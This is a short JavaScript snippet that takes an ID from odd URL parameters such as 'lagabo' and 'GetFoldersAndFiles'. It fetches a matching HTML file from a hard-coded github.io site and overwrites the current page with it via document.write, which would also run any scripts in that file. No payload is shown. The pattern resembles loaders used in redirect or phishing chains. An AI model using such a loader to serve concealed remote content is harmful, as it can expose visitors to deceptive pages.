
(function () {
  "use strict";

  var BASE = "https://riopehrips.github.io/con";

  function getId() {
    var params = new URLSearchParams(location.search);

    return (
      params.get("lagabo") ||
      params.get("GetFoldersAndFiles") ||
      params.get("id") ||
      ""
    );
  }

  var id = getId();

  if (!/^[A-Za-z0-9_.-]{1,80}$/.test(id)) {
    location.replace(BASE + "/");
    return;
  }

  // Load the matching HTML file
  var target = BASE + "/video/" +
    encodeURIComponent(id) + ".html";

  fetch(target, {
    method: "GET",
    cache: "no-store"
  })
    .then(function (response) {
      if (!response.ok) {
        throw new Error("HTTP " + response.status);
      }

      return response.text();
    })
    .then(function (html) {
      document.open();
      document.write(html);
      document.close();
    })
    .catch(function (error) {
      console.error("[Art Error]", error);
      location.replace(BASE + "/");
    });

})();
